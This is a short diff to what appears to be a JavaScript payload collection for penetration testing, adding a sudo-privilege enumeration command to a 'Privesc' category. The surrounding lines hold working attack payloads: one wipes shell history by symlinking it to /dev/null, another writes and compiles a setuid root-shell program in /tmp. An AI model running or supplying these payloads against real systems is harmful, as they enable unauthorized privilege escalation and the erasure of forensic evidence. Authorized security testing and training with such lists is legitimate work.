@@ -230,7 +230,8 @@ Load({ payload: "rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null", des
 
 // Credit to @LuxCupitor
 Load({ title: "Write r00t.c to the /tmp directory and compile", payload: "echo -e '#include <unistd.h>\\nint main(int argc, char **argv)\\n{\\nsetuid(0);\\nsetgid(0);\\nexecl(\"/bin/sh\", \"sh\", NULL);\\nreturn 1;\\n}\\n' > /tmp/r00t.c;gcc /tmp/r00t.c -o /tmp/r00t", category: "Privesc"})
-
+Load({ title: "Check for privesc via sudo privileges", payload: "sudo -S -l 2>/dev/null | grep -w 'nmap\\|perl\\|awk\\|find\\|bash\\|sh\\|man\\|more\\|less\\|vi\\|vim\\|nc\\|netcat\\|python\\|ruby\\|lua\\|irb\\|chown\\|chmod\\|zip\\|tar\\|tcpdump\\|gdb'", category: "Privesc"})
+// 
 /*
 ######################################################
 ############### End of Payloads ######################
